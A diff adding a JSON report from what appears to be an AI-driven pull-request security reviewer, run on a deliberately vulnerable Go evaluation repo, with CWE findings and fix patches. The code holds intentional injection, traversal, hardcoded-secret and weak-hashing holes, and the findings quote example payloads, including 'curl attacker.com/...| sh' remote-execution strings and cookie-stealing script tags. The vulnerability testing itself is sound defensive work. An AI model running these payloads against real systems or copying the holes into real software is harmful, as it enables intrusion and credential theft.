@@ -1,0 +1,422 @@
+{
+  "schema_version": 1,
+  "generated_at": 1789414623,
+  "generator": "secpr 0.1.0-dev · claude-opus-5",
+  "pr": {
+    "repo": "eval/vulns",
+    "number": 1,
+    "title": "vulns",
+    "head_sha": "245c5b89ef570933a1af36ba9295b09ace498246",
+    "files": [
+      {
+        "filename": "cmd-injection-sh.go",
+        "language": "go",
+        "status": "modified",
+        "patch": "@@ -1 +1,3 @@\n func pingHost(host string) ([]byte, error) {\n+\treturn exec.Command(\"sh\", \"-c\", \"ping -c 1 \"+host).Output()\n+}",
+        "source": "func pingHost(host string) ([]byte, error) {\n\treturn exec.Command(\"sh\", \"-c\", \"ping -c 1 \"+host).Output()\n}\n",
+        "added_lines": [
+          2,
+          3
+        ],
+        "chunks": [
+          {
+            "function_name": "pingHost",
+            "kind": "function",
+            "start_line": 1,
+            "end_line": 3,
+            "changed_lines": [
+              2,
+              3
+            ]
+          }
+        ]
+      },
+      {
+        "filename": "cmd-injection-shell.go",
+        "language": "go",
+        "status": "modified",
+        "patch": "@@ -1 +1,3 @@\n func archiveLog(filename string) error {\n+\treturn exec.Command(\"bash\", \"-c\", \"tar -czf /tmp/log.tgz \"+filename).Run()\n+}",
+        "source": "func archiveLog(filename string) error {\n\treturn exec.Command(\"bash\", \"-c\", \"tar -czf /tmp/log.tgz \"+filename).Run()\n}\n",
+        "added_lines": [
+          2,
+          3
+        ],
+        "chunks": [
+          {
+            "function_name": "archiveLog",
+            "kind": "function",
+            "start_line": 1,
+            "end_line": 3,
+            "changed_lines": [
+              2,
+              3
+            ]
+          }
+        ]
+      },
+      {
+        "filename": "hardcoded-jwt.go",
+        "language": "go",
+        "status": "modified",
+        "patch": "@@ -1 +1,5 @@\n func signToken(claims jwt.Claims) (string, error) {\n+\tsecret := []byte(\"supersecret123\")\n+\ttoken := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)\n+\treturn token.SignedString(secret)\n+}",
+        "source": "func signToken(claims jwt.Claims) (string, error) {\n\tsecret := []byte(\"supersecret123\")\n\ttoken := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)\n\treturn token.SignedString(secret)\n}\n",
+        "added_lines": [
+          2,
+          3,
+          4,
+          5
+        ],
+        "chunks": [
+          {
+            "function_name": "signToken",
+            "kind": "function",
+            "start_line": 1,
+            "end_line": 5,
+            "changed_lines": [
+              2,
+              3,
+              4,
+              5
+            ]
+          }
+        ]
+      },
+      {
+        "filename": "hardcoded-secret.go",
+        "language": "go",
+        "status": "modified",
+        "patch": "@@ -1 +1,3 @@\n func newClient() *Client {\n+\treturn &Client{APIKey: \"sk_live_4eC39HqLyjWDarjtT1zdp7dc\"}\n+}",
+        "source": "func newClient() *Client {\n\treturn &Client{APIKey: \"sk_live_4eC39HqLyjWDarjtT1zdp7dc\"}\n}\n",
+        "added_lines": [
+          2,
+          3
+        ],
+        "chunks": [
+          {
+            "function_name": "newClient",
+            "kind": "function",
+            "start_line": 1,
+            "end_line": 3,
+            "changed_lines": [
+              2,
+              3
+            ]
+          }
+        ]
+      },
+      {
+        "filename": "path-traversal.go",
+        "language": "go",
+        "status": "modified",
+        "patch": "@@ -1 +1,4 @@\n func readUserFile(filename string) ([]byte, error) {\n+\tpath := filepath.Join(\"/var/uploads\", filename)\n+\treturn os.ReadFile(path)\n+}",
+        "source": "func readUserFile(filename string) ([]byte, error) {\n\tpath := filepath.Join(\"/var/uploads\", filename)\n\treturn os.ReadFile(path)\n}\n",
+        "added_lines": [
+          2,
+          3,
+          4
+        ],
+        "chunks": [
+          {
+            "function_name": "readUserFile",
+            "kind": "function",
+            "start_line": 1,
+            "end_line": 4,
+            "changed_lines": [
+              2,
+              3,
+              4
+            ]
+          }
+        ]
+      },
+      {
+        "filename": "sqli-concat.go",
+        "language": "go",
+        "status": "modified",
+        "patch": "@@ -1 +1,6 @@\n package vulns\n+func searchUsers(db *sql.DB, q string) ([]User, error) {\n+    rows, err := db.Query(\"SELECT * FROM users WHERE name = '\" + q + \"'\")\n+    if err != nil { return nil, err }\n+    defer rows.Close()\n+    return scanUsers(rows)",
+        "source": "package vulns\nfunc searchUsers(db *sql.DB, q string) ([]User, error) {\n    rows, err := db.Query(\"SELECT * FROM users WHERE name = '\" + q + \"'\")\n    if err != nil { return nil, err }\n    defer rows.Close()\n    return scanUsers(rows)\n",
+        "added_lines": [
+          2,
+          3,
+          4,
+          5,
+          6
+        ],
+        "chunks": [
+          {
+            "function_name": "searchUsers",
+            "kind": "function",
+            "start_line": 2,
+            "end_line": 6,
+            "changed_lines": [
+              2,
+              3,
+              4,
+              5,
+              6
+            ]
+          }
+        ]
+      },
+      {
+        "filename": "sqli-sprintf.go",
+        "language": "go",
+        "status": "modified",
+        "patch": "@@ -1 +1,4 @@\n func getOrder(db *sql.DB, id string) (*Order, error) {\n+\tquery := fmt.Sprintf(\"SELECT * FROM orders WHERE id = %s\", id)\n+\treturn scanOrder(db.QueryRow(query))\n+}",
+        "source": "func getOrder(db *sql.DB, id string) (*Order, error) {\n\tquery := fmt.Sprintf(\"SELECT * FROM orders WHERE id = %s\", id)\n\treturn scanOrder(db.QueryRow(query))\n}\n",
+        "added_lines": [
+          2,
+          3,
+          4
+        ],
+        "chunks": [
+          {
+            "function_name": "getOrder",
+            "kind": "function",
+            "start_line": 1,
+            "end_line": 4,
+            "changed_lines": [
+              2,
+              3,
+              4
+            ]
+          }
+        ]
+      },
+      {
+        "filename": "weak-crypto.go",
+        "language": "go",
+        "status": "modified",
+        "patch": "@@ -1 +1,6 @@\n func hashPassword(password string) string {\n+    h := md5.New()\n+    h.Write([]byte(password))\n+    return hex.EncodeToString(h.Sum(nil))\n+}\n+",
+        "source": "func hashPassword(password string) string {\n    h := md5.New()\n    h.Write([]byte(password))\n    return hex.EncodeToString(h.Sum(nil))\n}\n\n",
+        "added_lines": [
+          2,
+          3,
+          4,
+          5,
+          6
+        ],
+        "chunks": [
+          {
+            "function_name": "hashPassword",
+            "kind": "function",
+            "start_line": 1,
+            "end_line": 5,
+            "changed_lines": [
+              2,
+              3,
+              4,
+              5
+            ]
+          }
+        ]
+      },
+      {
+        "filename": "xss-innerhtml.go",
+        "language": "go",
+        "status": "modified",
+        "patch": "@@ -1 +1,3 @@\n func renderProfile(w http.ResponseWriter, name string) {\n+\tfmt.Fprintf(w, \"<h1>Welcome, %s</h1>\", name)\n+}",
+        "source": "func renderProfile(w http.ResponseWriter, name string) {\n\tfmt.Fprintf(w, \"<h1>Welcome, %s</h1>\", name)\n}\n",
+        "added_lines": [
+          2,
+          3
+        ],
+        "chunks": [
+          {
+            "function_name": "renderProfile",
+            "kind": "function",
+            "start_line": 1,
+            "end_line": 3,
+            "changed_lines": [
+              2,
+              3
+            ]
+          }
+        ]
+      },
+      {
+        "filename": "xss-template.go",
+        "language": "go",
+        "status": "modified",
+        "patch": "@@ -1 +1,4 @@\n func renderComment(w io.Writer, comment string) {\n+\ttmpl, _ := template.New(\"c\").Parse(\"<div>\" + comment + \"</div>\")\n+\ttmpl.Execute(w, nil)\n+}",
+        "source": "func renderComment(w io.Writer, comment string) {\n\ttmpl, _ := template.New(\"c\").Parse(\"<div>\" + comment + \"</div>\")\n\ttmpl.Execute(w, nil)\n}\n",
+        "added_lines": [
+          2,
+          3,
+          4
+        ],
+        "chunks": [
+          {
+            "function_name": "renderComment",
+            "kind": "function",
+            "start_line": 1,
+            "end_line": 4,
+            "changed_lines": [
+              2,
+              3,
+              4
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "findings": [
+    {
+      "id": "F-4f5b3952",
+      "repo": "eval/vulns",
+      "pr": 1,
+      "file": "cmd-injection-sh.go",
+      "line": 2,
+      "cwe": "CWE-78",
+      "severity": "CRITICAL",
+      "summary": "User-supplied 'host' is concatenated into a shell command executed via sh -c in pingHost.",
+      "why_it_matters": "An attacker passing `example.com; curl attacker.com/x.sh | sh` achieves arbitrary remote command execution on the server.",
+      "fix_patch": "\treturn exec.Command(\"ping\", \"-c\", \"1\", \"--\", host).Output()",
+      "confidence": 0.99,
+      "created_at": 1789414577,
+      "status": "open"
+    },
+    {
+      "id": "F-05e2af15",
+      "repo": "eval/vulns",
+      "pr": 1,
+      "file": "cmd-injection-shell.go",
+      "line": 2,
+      "cwe": "CWE-78",
+      "severity": "CRITICAL",
+      "summary": "User-controlled 'filename' is concatenated into a bash -c command string in archiveLog, allowing arbitrary shell command injection.",
+      "why_it_matters": "An attacker passing a filename like 'x; curl attacker.com/s.sh | sh' achieves arbitrary remote code execution as the service user.",
+      "fix_patch": "\treturn exec.Command(\"tar\", \"-czf\", \"/tmp/log.tgz\", \"--\", filename).Run()",
+      "confidence": 0.99,
+      "created_at": 1789414577,
+      "status": "open"
+    },
+    {
+      "id": "F-39f5d258",
+      "repo": "eval/vulns",
+      "pr": 1,
+      "file": "hardcoded-jwt.go",
+      "line": 2,
+      "cwe": "CWE-798",
+      "severity": "CRITICAL",
+      "summary": "The JWT HMAC signing key is hardcoded as the literal string \"supersecret123\" in signToken.",
+      "why_it_matters": "Anyone with access to the source or binary can extract the secret and forge arbitrary JWTs (e.g. an admin token), completely bypassing authentication.",
+      "fix_patch": "\tsecret := []byte(os.Getenv(\"JWT_SIGNING_SECRET\"))\n\tif len(secret) == 0 {\n\t\treturn \"\", errors.New(\"JWT_SIGNING_SECRET is not configured\")\n\t}",
+      "confidence": 0.99,
+      "created_at": 1789414577,
+      "status": "open"
+    },
+    {
+      "id": "F-e49676f6",
+      "repo": "eval/vulns",
+      "pr": 1,
+      "file": "hardcoded-secret.go",
+      "line": 2,
+      "cwe": "CWE-798",
+      "severity": "CRITICAL",
+      "summary": "A live API secret key is hardcoded into the Client struct initialisation in newClient.",
+      "why_it_matters": "Anyone with read access to the repository or the compiled binary can extract the live key and impersonate the application against the upstream API, incurring charges or accessing customer data.",
+      "fix_patch": "\tapiKey := os.Getenv(\"API_KEY\")\n\tif apiKey == \"\" {\n\t\tpanic(\"API_KEY environment variable is not set\")\n\t}\n\treturn &Client{APIKey: apiKey}",
+      "confidence": 0.99,
+      "created_at": 1789414577,
+      "status": "open"
+    },
+    {
+      "id": "F-60206950",
+      "repo": "eval/vulns",
+      "pr": 1,
+      "file": "path-traversal.go",
+      "line": 2,
+      "cwe": "CWE-22",
+      "severity": "HIGH",
+      "summary": "User-controlled 'filename' is joined to /var/uploads without validating it stays within the base directory, allowing directory traversal.",
+      "why_it_matters": "An attacker passing '../../etc/passwd' (filepath.Join cleans but still resolves outside the base) can read arbitrary files on the server, including secrets and credentials.",
+      "fix_patch": "\tbase := \"/var/uploads\"\n\tpath := filepath.Join(base, filepath.Clean(\"/\"+filename))\n\tif !strings.HasPrefix(path, base+string(os.PathSeparator)) {\n\t\treturn nil, fmt.Errorf(\"invalid filename\")\n\t}\n\treturn os.ReadFile(path)",
+      "confidence": 0.95,
+      "created_at": 1789414577,
+      "status": "open"
+    },
+    {
+      "id": "F-400509f9",
+      "repo": "eval/vulns",
+      "pr": 1,
+      "file": "sqli-concat.go",
+      "line": 3,
+      "cwe": "CWE-89",
+      "severity": "HIGH",
+      "summary": "The user-supplied 'q' parameter is concatenated directly into the SQL query string in searchUsers without parameterisation.",
+      "why_it_matters": "An attacker can submit q=' OR '1'='1 to dump every row in the users table, or use a UNION SELECT to read arbitrary tables such as credentials.",
+      "fix_patch": "    rows, err := db.Query(\"SELECT * FROM users WHERE name = ?\", q)",
+      "confidence": 0.99,
+      "created_at": 1789414577,
+      "status": "open"
+    },
+    {
+      "id": "F-c76bd6e5",
+      "repo": "eval/vulns",
+      "pr": 1,
+      "file": "sqli-sprintf.go",
+      "line": 2,
+      "cwe": "CWE-89",
+      "severity": "HIGH",
+      "summary": "The 'id' parameter is interpolated into the SQL string via fmt.Sprintf without parameterisation in getOrder.",
+      "why_it_matters": "An attacker can pass id=\"1 UNION SELECT ... --\" to read arbitrary tables or destroy data with a single crafted request.",
+      "fix_patch": "\tconst query = \"SELECT * FROM orders WHERE id = ?\"\n\treturn scanOrder(db.QueryRow(query, id))",
+      "confidence": 0.99,
+      "created_at": 1789414577,
+      "status": "open"
+    },
+    {
+      "id": "F-8aaeed5e",
+      "repo": "eval/vulns",
+      "pr": 1,
+      "file": "weak-crypto.go",
+      "line": 2,
+      "cwe": "CWE-916",
+      "severity": "HIGH",
+      "summary": "Passwords are hashed with unsalted MD5 in hashPassword, a fast, broken hash unsuitable for credential storage.",
+      "why_it_matters": "An attacker who obtains the password database can recover plaintext passwords almost instantly using rainbow tables or GPU brute-force against unsalted MD5.",
+      "fix_patch": "    hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)\n    if err != nil {\n        return \"\"\n    }\n    return string(hash)",
+      "confidence": 0.95,
+      "created_at": 1789414577,
+      "status": "open"
+    },
+    {
+      "id": "F-d6c89b3d",
+      "repo": "eval/vulns",
+      "pr": 1,
+      "file": "xss-innerhtml.go",
+      "line": 2,
+      "cwe": "CWE-79",
+      "severity": "MEDIUM",
+      "summary": "User-controlled 'name' is written directly into an HTML response via fmt.Fprintf without escaping, in renderProfile.",
+      "why_it_matters": "An attacker can supply a name like <script>fetch('//evil/?c='+document.cookie)</script> to execute arbitrary JavaScript in victims' browsers and steal sessions.",
+      "fix_patch": "\tw.Header().Set(\"Content-Type\", \"text/html; charset=utf-8\")\n\tfmt.Fprintf(w, \"<h1>Welcome, %s</h1>\", html.EscapeString(name))",
+      "confidence": 0.95,
+      "created_at": 1789414577,
+      "status": "open"
+    },
+    {
+      "id": "F-e7881137",
+      "repo": "eval/vulns",
+      "pr": 1,
+      "file": "xss-template.go",
+      "line": 2,
+      "cwe": "CWE-79",
+      "severity": "MEDIUM",
+      "summary": "User-supplied `comment` is concatenated into the template source string passed to template.Parse, bypassing contextual auto-escaping and allowing template/HTML injection.",
+      "why_it_matters": "An attacker can post a comment containing `<script>fetch('//evil/'+document.cookie)</script>` (or `{{...}}` template actions) which is parsed as trusted template text and executed in every viewer's browser, enabling session theft.",
+      "fix_patch": "\ttmpl, _ := template.New(\"c\").Parse(\"<div>{{.}}</div>\")\n\ttmpl.Execute(w, comment)",
+      "confidence": 0.95,
+      "created_at": 1789414577,
+      "status": "open"
+    }
+  ],
+  "stats": {
+    "files": 10,
+    "chunks": 10,
+    "llm_calls": 10,
+    "duration_ms": 45217
+  }
+}
